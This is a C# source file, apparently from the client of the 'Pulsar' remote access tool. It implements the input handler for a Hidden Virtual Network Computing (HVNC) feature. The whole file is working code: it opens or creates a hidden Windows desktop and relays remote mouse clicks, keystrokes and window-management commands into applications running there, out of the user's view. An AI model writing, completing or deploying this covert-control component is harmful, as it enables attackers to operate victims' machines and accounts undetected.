using Pulsar.Common.Enums;
using Pulsar.Common.Messages.Monitoring.HVNC;
using Pulsar.Common.Messages.Monitoring.RemoteDesktop;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

namespace Pulsar.Client.Helper.HVNC
{
    /// <summary>
    /// Handles input for the Hidden Virtual Network Computing (HVNC) feature.
    /// </summary>
    public class InputHandler : IDisposable
    {
        #region Win32 API Imports

        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr OpenDesktop(string lpszDesktop, int dwFlags, bool fInherit, uint dwDesiredAccess);

        [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern IntPtr CreateDesktop(string lpszDesktop, IntPtr lpszDevice, IntPtr pDevmode, int dwFlags, uint dwDesiredAccess, IntPtr lpsa);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool CloseDesktop(IntPtr hDesktop);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool SetThreadDesktop(IntPtr hDesktop);

        [DllImport("user32.dll")]
        private static extern IntPtr WindowFromPoint(POINT point);

        [DllImport("user32.dll")]
        private static extern IntPtr SendMessage(IntPtr hWnd, uint msg, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern IntPtr PostMessage(IntPtr hWnd, uint msg, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);

        [DllImport("user32.dll")]
        private static extern bool ScreenToClient(IntPtr hWnd, ref POINT lpPoint);

        [DllImport("user32.dll")]
        private static extern IntPtr ChildWindowFromPoint(IntPtr hWnd, POINT point);

        [DllImport("user32.dll")]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

        [DllImport("user32.dll")]
        private static extern bool PtInRect(ref RECT lprc, POINT pt);

        [DllImport("user32.dll")]
        private static extern bool SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);

        [DllImport("user32.dll")]
        private static extern int GetWindowLong(IntPtr hWnd, int nIndex);

        [DllImport("user32.dll")]
        private static extern bool GetWindowPlacement(IntPtr hWnd, ref WINDOWPLACEMENT lpwndpl);

        [DllImport("user32.dll")]
        private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

        [DllImport("user32.dll")]
        private static extern int MenuItemFromPoint(IntPtr hWnd, IntPtr hMenu, POINT pt);

        [DllImport("user32.dll")]
        private static extern int GetMenuItemID(IntPtr hMenu, int nPos);

        [DllImport("user32.dll")]
        private static extern IntPtr GetSubMenu(IntPtr hMenu, int nPos);

        [DllImport("user32.dll")]
        private static extern bool MoveWindow(IntPtr hWnd, int x, int y, int width, int height, bool repaint);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern int RealGetWindowClass(IntPtr hwnd, [Out] StringBuilder pszType, int cchType);

        [DllImport("user32.dll")]
        private static extern IntPtr GetWindow(IntPtr hWnd, uint uCmd);

        [DllImport("user32.dll")]
        private static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern bool IsWindowVisible(IntPtr hWnd);

        [DllImport("user32.dll")]
        private static extern bool IsWindow(IntPtr hWnd);

        [DllImport("user32.dll")]
        private static extern bool PrintWindow(IntPtr hwnd, IntPtr hdcBlt, uint nFlags);

        [DllImport("user32.dll")]
        private static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);

        [DllImport("user32.dll")]
        private static extern bool GetClientRect(IntPtr hWnd, out RECT lpRect);

        [DllImport("user32.dll")]
        private static extern IntPtr GetDesktopWindow();

        [DllImport("user32.dll")]
        private static extern uint MapVirtualKey(uint uCode, uint uMapType);

        [DllImport("user32.dll")]
        private static extern short GetKeyState(int nVirtKey);

        [DllImport("user32.dll")]
        private static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpKeyState,
            [Out, MarshalAs(UnmanagedType.LPWStr, SizeConst = 64)] System.Text.StringBuilder pwszBuff,
            int cchBuff, uint wFlags);

        [DllImport("user32.dll")]
        private static extern bool GetKeyboardState(byte[] lpKeyState);

        private delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);

        #endregion

        #region Constants

        // Window style constants
        private const int GWL_STYLE = -16;
        private const int WS_DISABLED = 0x8000000;

        // Window message constants
        private const int WM_CHAR = 0x0102;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_KEYUP = 0x0101;
        private const int WM_LBUTTONUP = 0x0202;
        private const int WM_LBUTTONDOWN = 0x0201;
        private const int WM_MOUSEMOVE = 0x0200;
        private const int WM_CLOSE = 0x0010;
        private const int WM_SYSCOMMAND = 0x0112;
        private const int WM_NCHITTEST = 0x0084;
        private const int WM_RBUTTONUP = 0x0205;
        private const int WM_RBUTTONDOWN = 0x0204;
        private const int WM_DESTROY = 0x0002;

        // Mouse button constants
        private const int MK_LBUTTON = 0x0001;
        private const int MK_RBUTTON = 0x0002;

        // System command constants
        private const int SC_MINIMIZE = 0xF020;
        private const int SC_RESTORE = 0xF120;
        private const int SC_MAXIMIZE = 0xF030;

        // Hit test area constants
        private const int HTCAPTION = 2;
        private const int HTTOP = 12;
        private const int HTBOTTOM = 15;
        private const int HTLEFT = 10;
        private const int HTRIGHT = 11;
        private const int HTTOPLEFT = 13;
        private const int HTTOPRIGHT = 14;
        private const int HTBOTTOMLEFT = 16;
        private const int HTBOTTOMRIGHT = 17;
        private const int HTCLOSE = 20;
        private const int HTMINBUTTON = 8;
        private const int HTMAXBUTTON = 9;
        private const int HTTRANSPARENT = -1;

        // Window enumeration constants
        private const uint GW_HWNDPREV = 3;
        private const uint GW_HWNDNEXT = 2;

        // Miscellaneous constants
        private const int VK_RETURN = 0x0D;
        private const int MN_GETHMENU = 0x01E1;
        private const int BM_CLICK = 0x00F5;
        private const int MAX_PATH = 260;
        private const int SW_SHOWMAXIMIZED = 3;
        private const int SW_RESTORE = 9;

        private const int VK_SHIFT = 0x10;
        private const int VK_CONTROL = 0x11;
        private const int VK_MENU = 0x12; // Alt key
        private const int VK_LSHIFT = 0xA0;
        private const int VK_RSHIFT = 0xA1;
        private const int VK_LCONTROL = 0xA2;
        private const int VK_RCONTROL = 0xA3;
        private const int VK_LMENU = 0xA4; // Left Alt
        private const int VK_RMENU = 0xA5; // Right Alt
        private const int VK_CAPITAL = 0x14; // Caps Lock

        #endregion

        #region Fields and Properties

        private readonly string desktopName;
        private bool isMovingWindow = false;
        private POINT lastClickCoords = new POINT { x = 0, y = 0 };
        private POINT lastWindowDimensions = new POINT { x = 0, y = 0 };
        private IntPtr windowToMove = IntPtr.Zero;
        private IntPtr workingWindow = IntPtr.Zero;
        private static readonly object syncLock = new object();

        private bool isShiftPressed = false;
        private bool isControlPressed = false;
        private bool isAltPressed = false;
        private bool isCapsLockOn = false;

        // Window validation and retry mechanism
        private int consecutiveWindowLookupFailures = 0;
        private const int MAX_CONSECUTIVE_FAILURES = 3;
        private System.Diagnostics.Stopwatch lastFailureLogTime = new System.Diagnostics.Stopwatch();

        // Input queue and flow control
        private int inputQueueLength = 0;
        private const int MAX_INPUT_QUEUE_LENGTH = 100;
        private System.Diagnostics.Stopwatch windowStateTimeout = new System.Diagnostics.Stopwatch();
        private const int WINDOW_STATE_TIMEOUT_MS = 10000; // 10 second timeout for window state

        // Diagnostic/logging
        private long totalInputMessagesReceived = 0;
        private long totalInputMessagesProcessed = 0;
        private long totalInputMessagesFailed = 0;
        private long totalWindowLookupFailures = 0;
        private long totalWindowValidationFailures = 0;

        /// <summary>
        /// Gets the desktop handle.
        /// </summary>
        public IntPtr Desktop { get; private set; } = IntPtr.Zero;

        /// <summary>
        /// Gets diagnostic information about input processing.
        /// </summary>
        public string GetDiagnostics()
        {
            lock (syncLock)
            {
                return $"[InputHandler Diagnostics] Messages: {totalInputMessagesReceived} received, {totalInputMessagesProcessed} processed, {totalInputMessagesFailed} failed | " +
                       $"Window Lookups: {totalWindowLookupFailures} failed, {totalWindowValidationFailures} validation failures | " +
                       $"Queue: {inputQueueLength}/{MAX_INPUT_QUEUE_LENGTH} | " +
                       $"Working Window: 0x{workingWindow:X8} (Valid: {IsValidWindow(workingWindow)}) | " +
                       $"Consecutive Failures: {consecutiveWindowLookupFailures}";
            }
        }

        #endregion

        #region Constructor and Dispose

        /// <summary>
        /// Initializes a new instance of the <see cref="InputHandler"/> class.
        /// </summary>
        /// <param name="desktopName">The name of the desktop to handle input for.</param>
        public InputHandler(string desktopName)
        {
            this.desktopName = desktopName;
            IntPtr desktopHandle = OpenDesktop(desktopName, 0, true, (uint)DESKTOP_ACCESS.GENERIC_ALL);
            if (desktopHandle == IntPtr.Zero)
            {
                desktopHandle = CreateDesktop(desktopName, IntPtr.Zero, IntPtr.Zero, 0, (uint)DESKTOP_ACCESS.GENERIC_ALL, IntPtr.Zero);
            }
            this.Desktop = desktopHandle;

            InitializeModifierKeyStates();
        }

        /// <summary>
        /// Releases all resources used by the InputHandler.
        /// </summary>
        public void Dispose()
        {
            CloseDesktop(this.Desktop);
            GC.Collect();
        }

        #endregion

        #region Keyboard Helper Methods

        /// <summary>
        /// Initializes the modifier key states by checking the current system state.
        /// </summary>
        private void InitializeModifierKeyStates()
        {
            isShiftPressed = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
            isControlPressed = (GetKeyState(VK_CONTROL) & 0x8000) != 0;
            isAltPressed = (GetKeyState(VK_MENU) & 0x8000) != 0;
            isCapsLockOn = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
        }

        /// <summary>
        /// Handles keyboard input with proper modifier tracking and character conversion.
        /// </summary>
        /// <param name="msg">The keyboard message</param>
        /// <param name="wParam">The wParam containing the virtual key code</param>
        /// <param name="lParam">The original lParam</param>
        /// <param name="targetWindow">The target window to send messages to</param>
        private void HandleKeyboardInput(uint msg, IntPtr wParam, IntPtr lParam, IntPtr targetWindow)
        {
            int virtualKey = wParam.ToInt32();

            UpdateModifierKeyState(msg, virtualKey);

            if (msg == WM_KEYDOWN)
            {
                if (IsModifierKey(virtualKey))
                {
                    IntPtr modifierLParam = BuildKeyboardLParam(msg, wParam);
                    PostMessage(targetWindow, msg, wParam, modifierLParam);
                    return;
                }

                char[] chars = VirtualKeyToChar(virtualKey);
                bool isPrintableChar = (chars != null && chars.Length > 0 && chars[0] != '\0');

                if (isPrintableChar)
                {
                    IntPtr charLParam = BuildKeyboardLParam(WM_CHAR, wParam);
                    foreach (char ch in chars)
                    {
                        if (ch != '\0')
                        {
                            PostMessage(targetWindow, WM_CHAR, new IntPtr(ch), charLParam);
                        }
                    }
                }
                else
                {
                    IntPtr properLParam = BuildKeyboardLParam(msg, wParam);
                    PostMessage(targetWindow, msg, wParam, properLParam);
                }
            }
            else if (msg == WM_KEYUP)
            {
                IntPtr properLParam = BuildKeyboardLParam(msg, wParam);
                PostMessage(targetWindow, msg, wParam, properLParam);
            }
            else if (msg == WM_CHAR)
            {
                PostMessage(targetWindow, msg, wParam, lParam);
            }
        }

        /// <summary>
        /// Updates the internal modifier key state tracking.
        /// </summary>
        /// <param name="msg">The keyboard message</param>
        /// <param name="virtualKey">The virtual key code</param>
        private void UpdateModifierKeyState(uint msg, int virtualKey)
        {
            bool keyDown = (msg == WM_KEYDOWN);

            switch (virtualKey)
            {
                case VK_SHIFT:
                case VK_LSHIFT:
                case VK_RSHIFT:
                    isShiftPressed = keyDown;
                    break;

                case VK_CONTROL:
                case VK_LCONTROL:
                case VK_RCONTROL:
                    isControlPressed = keyDown;
                    break;

                case VK_MENU:
                case VK_LMENU:
                case VK_RMENU:
                    isAltPressed = keyDown;
                    break;

                case VK_CAPITAL:
                    if (keyDown)
                    {
                        isCapsLockOn = !isCapsLockOn;
                    }
                    break;
            }
        }

        /// <summary>
        /// Converts a virtual key to its character representation considering modifier states.
        /// </summary>
        /// <param name="virtualKey">The virtual key code</param>
        /// <returns>Array of characters, or null if not a printable character</returns>
        private char[] VirtualKeyToChar(int virtualKey)
        {
            if (IsModifierKey(virtualKey) || IsNonPrintableKey(virtualKey))
            {
                return null;
            }

            byte[] keyboardState = new byte[256];

            if (isShiftPressed)
            {
                keyboardState[VK_SHIFT] = 0x80;
            }

            if (isControlPressed)
            {
                keyboardState[VK_CONTROL] = 0x80;
            }

            if (isAltPressed)
            {
                keyboardState[VK_MENU] = 0x80;
            }

            if (isCapsLockOn)
            {
                keyboardState[VK_CAPITAL] = 0x01;
            }


            var buffer = new StringBuilder(64);
            uint scanCode = MapVirtualKey((uint)virtualKey, 0);

            int result = ToUnicode((uint)virtualKey, scanCode, keyboardState, buffer, buffer.Capacity, 0);

            if (result > 0)
            {
                return buffer.ToString().Substring(0, result).ToCharArray();
            }

            return null;
        }

        /// <summary>
        /// Determines if a virtual key is a modifier key.
        /// </summary>
        /// <param name="virtualKey">The virtual key code</param>
        /// <returns>True if the key is a modifier key</returns>
        private bool IsModifierKey(int virtualKey)
        {
            switch (virtualKey)
            {
                case VK_SHIFT:
                case VK_LSHIFT:
                case VK_RSHIFT:
                case VK_CONTROL:
                case VK_LCONTROL:
                case VK_RCONTROL:
                case VK_MENU:
                case VK_LMENU:
                case VK_RMENU:
                case VK_CAPITAL:
                    return true;
                default:
                    return false;
            }
        }

        /// <summary>
        /// Determines if a virtual key is a non-printable key (function keys, arrows, etc.).
        /// </summary>
        /// <param name="virtualKey">The virtual key code</param>
        /// <returns>True if the key is non-printable</returns>
        private bool IsNonPrintableKey(int virtualKey)
        {
            if (virtualKey >= 0x70 && virtualKey <= 0x7B) return true;

            switch (virtualKey)
            {
                case 0x21: // VK_PRIOR (Page Up)
                case 0x22: // VK_NEXT (Page Down)
                case 0x23: // VK_END
                case 0x24: // VK_HOME
                case 0x25: // VK_LEFT
                case 0x26: // VK_UP
                case 0x27: // VK_RIGHT
                case 0x28: // VK_DOWN
                case 0x2D: // VK_INSERT
                case 0x2E: // VK_DELETE
                case 0x5B: // VK_LWIN
                case 0x5C: // VK_RWIN
                case 0x5D: // VK_APPS
                case 0x91: // VK_SCROLL
                case 0x90: // VK_NUMLOCK
                case 0x0D: // VK_RETURN (Enter)
                case 0x1B: // VK_ESCAPE
                case 0x09: // VK_TAB
                case 0x08: // VK_BACK (Backspace)
                    return true;
                default:
                    return false;
            }
        }

        /// <summary>
        /// Builds the appropriate lParam value for keyboard messages.
        /// </summary>
        /// <param name="message">The keyboard message (WM_KEYDOWN, WM_KEYUP, WM_CHAR)</param>
        /// <param name="wParam">The wParam containing the virtual key code</param>
        /// <returns>The properly formatted lParam for the keyboard message</returns>
        private IntPtr BuildKeyboardLParam(uint message, IntPtr wParam)
        {
            int vk = wParam.ToInt32();
            uint scanCode = MapVirtualKey((uint)vk, 0);

            int lParam = 0;

            lParam |= 1;

            lParam |= (int)(scanCode << 16);

            if (IsExtendedKey(vk))
            {
                lParam |= (1 << 24);
            }

            if (message == WM_KEYUP)
            {
                lParam |= (1 << 30);
                lParam |= (1 << 31);
            }

            return new IntPtr(lParam);
        }

        /// <summary>
        /// Determines if a virtual key code represents an extended key.
        /// </summary>
        /// <param name="virtualKey">The virtual key code</param>
        /// <returns>True if the key is an extended key</returns>
        private bool IsExtendedKey(int virtualKey)
        {
            switch (virtualKey)
            {
                case 0x21: // VK_PRIOR (Page Up)
                case 0x22: // VK_NEXT (Page Down)
                case 0x23: // VK_END
                case 0x24: // VK_HOME
                case 0x25: // VK_LEFT
                case 0x26: // VK_UP
                case 0x27: // VK_RIGHT
                case 0x28: // VK_DOWN
                case 0x2D: // VK_INSERT
                case 0x2E: // VK_DELETE
                case 0x5B: // VK_LWIN
                case 0x5C: // VK_RWIN
                case 0x5D: // VK_APPS
                case 0xA0: // VK_LSHIFT (when differentiated from VK_SHIFT)
                case 0xA1: // VK_RSHIFT
                case 0xA2: // VK_LCONTROL
                case 0xA3: // VK_RCONTROL
                case 0xA4: // VK_LMENU (Left Alt)
                case 0xA5: // VK_RMENU (Right Alt)
                case 0x91: // VK_SCROLL
                    return true;
                default:
                    return false;
            }
        }

        #endregion

        #region Helper Methods

        /// <summary>
        /// Gets the X coordinate from an lParam.
        /// </summary>
        public static int GetXCoordinate(IntPtr lParam)
        {
            return (int)((short)(lParam.ToInt32() & 0xFFFF));
        }

        /// <summary>
        /// Gets the Y coordinate from an lParam.
        /// </summary>
        public static int GetYCoordinate(IntPtr lParam)
        {
            return (int)((short)(lParam.ToInt32() >> 16 & 0xFFFF));
        }

        /// <summary>
        /// Creates an lParam from X and Y coordinates.
        /// </summary>
        public static IntPtr MakeLParam(int lowWord, int highWord)
        {
            return new IntPtr(highWord << 16 | (lowWord & 0xFFFF));
        }

        /// <summary>
        /// Calculates relative coordinates from screen to window
        /// </summary>
        private POINT ScreenToWindow(int screenX, int screenY, int windowX, int windowY, int windowWidth, int windowHeight)
        {
            int relativeX = screenX - windowX;
            int relativeY = screenY - windowY;

            if (relativeX >= 0 && relativeX < windowWidth && relativeY >= 0 && relativeY < windowHeight)
                return new POINT { x = relativeX, y = relativeY };
            else
                return new POINT { x = -1, y = -1 };
        }

        /// <summary>
        /// Verifies that a window handle is valid and exists on the correct desktop.
        /// </summary>
        private bool IsValidWindow(IntPtr hWnd)
        {
            if (hWnd == IntPtr.Zero)
                return false;

            try
            {
                // Check if window still exists
                RECT rect;
                if (!GetWindowRect(hWnd, out rect))
                {
                    return false;
                }

                return true;
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"[InputHandler] Window validation error: {ex.Message}");
                return false;
            }
        }

        /// <summary>
        /// Finds the target window with retry and fallback logic.
        /// </summary>
        private IntPtr FindTargetWindow(POINT cursorPosition)
        {
            IntPtr hwnd = WindowFromPoint(cursorPosition);

            if (hwnd == IntPtr.Zero)
            {
                consecutiveWindowLookupFailures++;
                
                // Log failures periodically to avoid spam
                if (!lastFailureLogTime.IsRunning || lastFailureLogTime.ElapsedMilliseconds > 2000)
                {
                    Debug.WriteLine($"[InputHandler] Warning: WindowFromPoint returned null at ({cursorPosition.x}, {cursorPosition.y}). Consecutive failures: {consecutiveWindowLookupFailures}");
                    if (lastFailureLogTime.IsRunning)
                        lastFailureLogTime.Restart();
                    else
                        lastFailureLogTime.Start();
                }

                if (consecutiveWindowLookupFailures >= MAX_CONSECUTIVE_FAILURES)
                {
                    Debug.WriteLine($"[InputHandler] Max consecutive failures reached ({MAX_CONSECUTIVE_FAILURES}). Clearing cached window.");
                    workingWindow = IntPtr.Zero;
                }

                // If we have a cached working window, try to use it
                if (IsValidWindow(workingWindow))
                {
                    Debug.WriteLine($"[InputHandler] Using cached window: 0x{workingWindow:X8}");
                    return workingWindow;
                }

                return IntPtr.Zero;
            }

            // Reset failure counter on successful lookup
            consecutiveWindowLookupFailures = 0;
            if (lastFailureLogTime.IsRunning)
                lastFailureLogTime.Stop();

            return hwnd;
        }

        #endregion

        #region Input Processing

        /// <summary>
        /// Processes an input message and sends it to the appropriate window.
        /// Includes queue control, timeout monitoring, and comprehensive logging.
        /// </summary>
        /// <param name="msg">The message to process.</param>
        /// <param name="wParam">The wParam of the message.</param>
        /// <param name="lParam">The lParam of the message.</param>
        public void Input(uint msg, IntPtr wParam, IntPtr lParam)
        {
            lock (syncLock)
            {
                try
                {
                    // Track input statistics
                    totalInputMessagesReceived++;
                    inputQueueLength++;

                    // Queue overflow protection
                    if (inputQueueLength > MAX_INPUT_QUEUE_LENGTH)
                    {
                        totalInputMessagesFailed++;
                        inputQueueLength--;
                        Debug.WriteLine($"[InputHandler] WARNING: Input queue overflow ({inputQueueLength}/{MAX_INPUT_QUEUE_LENGTH}). Dropping message (msg: {msg:X4})");
                        return;
                    }

                    // Window state timeout monitoring
                    if (!windowStateTimeout.IsRunning)
                    {
                        windowStateTimeout.Start();
                    }
                    else if (windowStateTimeout.ElapsedMilliseconds > WINDOW_STATE_TIMEOUT_MS && IsValidWindow(workingWindow))
                    {
                        // Periodic verification that window is still valid
                        if (!IsValidWindow(workingWindow))
                        {
                            Debug.WriteLine($"[InputHandler] Window timeout: working window 0x{workingWindow:X8} no longer valid after {windowStateTimeout.ElapsedMilliseconds}ms");
                            workingWindow = IntPtr.Zero;
                            windowStateTimeout.Restart();
                        }
                    }

                    SetThreadDesktop(this.Desktop);

                    // Handle mouse messages
                    if (msg == WM_LBUTTONDOWN || msg == WM_LBUTTONUP ||
                        msg == WM_RBUTTONDOWN || msg == WM_RBUTTONUP ||
                        msg == WM_MOUSEMOVE)
                    {
                        HandleMouseInput(msg, wParam, lParam);
                        totalInputMessagesProcessed++;
                    }
                    // Handle keyboard messages
                    else if (msg == WM_KEYDOWN || msg == WM_KEYUP || msg == WM_CHAR)
                    {
                        HandleKeyboardInputEx(msg, wParam, lParam);
                        totalInputMessagesProcessed++;
                    }
                    else
                    {
                        // Unknown message type
                        Debug.WriteLine($"[InputHandler] Unknown input message type: {msg:X4}");
                        totalInputMessagesFailed++;
                    }

                    inputQueueLength--;
                }
                catch (Exception ex)
                {
                    totalInputMessagesFailed++;
                    inputQueueLength--;
                    Debug.WriteLine($"[InputHandler] Unexpected error in Input method: {ex.Message}\n{ex.StackTrace}");
                }
            }
        }

        /// <summary>
        /// Handles mouse input with enhanced error tracking.
        /// </summary>
        private void HandleMouseInput(uint msg, IntPtr wParam, IntPtr lParam)
        {
            int x = GetXCoordinate(lParam);
            int y = GetYCoordinate(lParam);
            POINT cursorPosition = new POINT { x = x, y = y };

            bool isLeft = (msg == WM_LBUTTONDOWN || msg == WM_LBUTTONUP);
            bool isUp = (msg == WM_LBUTTONUP || msg == WM_RBUTTONUP);

            if (isMovingWindow && isUp && isLeft)
            {
                // Complete window move operation
                SetWindowPos(windowToMove, IntPtr.Zero,
                    x - lastClickCoords.x,
                    y - lastClickCoords.y,
                    lastWindowDimensions.x,
                    lastWindowDimensions.y,
                    0);
                isMovingWindow = false;
            }

            // Find target window with retry logic
            IntPtr hwnd = FindTargetWindow(cursorPosition);
            
            if (hwnd != IntPtr.Zero)
            {
                workingWindow = hwnd;
                totalWindowLookupFailures = 0; // Reset on success
            }
            else if (hwnd == IntPtr.Zero && workingWindow == IntPtr.Zero)
            {
                totalWindowLookupFailures++;
                Debug.WriteLine($"[InputHandler] Mouse at ({x}, {y}): no window found (lookup failures: {totalWindowLookupFailures})");
                return;
            }

            if (hwnd != IntPtr.Zero)
            {
                try
                {
                    RECT windowRect;
                    if (!GetWindowRect(hwnd, out windowRect))
                    {
                        totalWindowValidationFailures++;
                        Debug.WriteLine($"[InputHandler] GetWindowRect failed for 0x{hwnd:X8} (validation failures: {totalWindowValidationFailures})");
                        workingWindow = IntPtr.Zero;
                        return;
                    }

                    int windowX = windowRect.left;
                    int windowY = windowRect.top;
                    int windowWidth = windowRect.right - windowRect.left;
                    int windowHeight = windowRect.bottom - windowRect.top;

                    POINT clickCoords = ScreenToWindow(x, y, windowX, windowY, windowWidth, windowHeight);
                    IntPtr hitTestResult = SendMessage(hwnd, WM_NCHITTEST, IntPtr.Zero, lParam);
                    int hitTestResultInt = hitTestResult.ToInt32();

                    // Route based on hit test result
                    if (hitTestResultInt == HTCLOSE && msg == WM_LBUTTONUP)
                    {
                        PostMessage(hwnd, WM_CLOSE, IntPtr.Zero, IntPtr.Zero);
                        PostMessage(hwnd, WM_DESTROY, IntPtr.Zero, IntPtr.Zero);
                    }
                    else if (hitTestResultInt == HTCAPTION && !isUp && isLeft && msg == WM_LBUTTONDOWN)
                    {
                        lastClickCoords = clickCoords;
                        lastWindowDimensions = new POINT { x = windowWidth, y = windowHeight };
                        isMovingWindow = true;
                        windowToMove = hwnd;
                    }
                    else if (hitTestResultInt == HTMAXBUTTON && msg == WM_LBUTTONUP)
                    {
                        WINDOWPLACEMENT windowPlacement = default;
                        windowPlacement.length = Marshal.SizeOf<WINDOWPLACEMENT>(windowPlacement);
                        GetWindowPlacement(hwnd, ref windowPlacement);

                        if ((windowPlacement.flags & SW_SHOWMAXIMIZED) != 0)
                            PostMessage(hwnd, WM_SYSCOMMAND, new IntPtr(SC_RESTORE), IntPtr.Zero);
                        else
                            PostMessage(hwnd, WM_SYSCOMMAND, new IntPtr(SC_MAXIMIZE), IntPtr.Zero);
                    }
                    else if (hitTestResultInt == HTMINBUTTON && msg == WM_LBUTTONUP)
                    {
                        PostMessage(hwnd, WM_SYSCOMMAND, new IntPtr(SC_MINIMIZE), IntPtr.Zero);
                    }
                    else
                    {
                        // Regular window click
                        IntPtr param = isLeft ? new IntPtr(MK_LBUTTON) : new IntPtr(MK_RBUTTON);
                        IntPtr translatedLParam = MakeLParam(clickCoords.x, clickCoords.y);
                        PostMessage(hwnd, msg, param, translatedLParam);
                    }
                }
                catch (Exception ex)
                {
                    totalInputMessagesFailed++;
                    Debug.WriteLine($"[InputHandler] Mouse message processing error: {ex.Message}");
                    workingWindow = IntPtr.Zero;
                }
            }
        }

        /// <summary>
        /// Handles keyboard input with enhanced validation and error tracking.
        /// </summary>
        private void HandleKeyboardInputEx(uint msg, IntPtr wParam, IntPtr lParam)
        {
            if (!IsValidWindow(workingWindow))
            {
                totalWindowValidationFailures++;
                Debug.WriteLine($"[InputHandler] Keyboard input: working window invalid (0x{workingWindow:X8}). Clearing and waiting for valid window (validation failures: {totalWindowValidationFailures})");
                workingWindow = IntPtr.Zero;
                return;
            }

            try
            {
                HandleKeyboardInput(msg, wParam, lParam, workingWindow);
            }
            catch (Exception ex)
            {
                totalInputMessagesFailed++;
                Debug.WriteLine($"[InputHandler] Keyboard processing error: {ex.Message}");
                workingWindow = IntPtr.Zero;
            }
        }

        #endregion

        #region Nested Types

        /// <summary>
        /// Desktop access rights flags.
        /// </summary>
        private enum DESKTOP_ACCESS : uint
        {
            DESKTOP_NONE,
            DESKTOP_READOBJECTS,
            DESKTOP_CREATEWINDOW,
            DESKTOP_CREATEMENU = 4U,
            DESKTOP_HOOKCONTROL = 8U,
            DESKTOP_JOURNALRECORD = 16U,
            DESKTOP_JOURNALPLAYBACK = 32U,
            DESKTOP_ENUMERATE = 64U,
            DESKTOP_WRITEOBJECTS = 128U,
            DESKTOP_SWITCHDESKTOP = 256U,
            GENERIC_ALL = 511U
        }

        /// <summary>
        /// Represents a point (x,y coordinates).
        /// </summary>
        public struct POINT
        {
            public int x;
            public int y;
        }

        /// <summary>
        /// Represents a rectangle.
        /// </summary>
        public struct RECT
        {
            public int left;
            public int top;
            public int right;
            public int bottom;
        }

        /// <summary>
        /// Contains information about the placement of a window.
        /// </summary>
        public struct WINDOWPLACEMENT
        {
            public int length;
            public int flags;
            public int showCmd;
            public POINT ptMinPosition;
            public POINT ptMaxPosition;
            public RECT rcNormalPosition;
        }

        #endregion
    }
}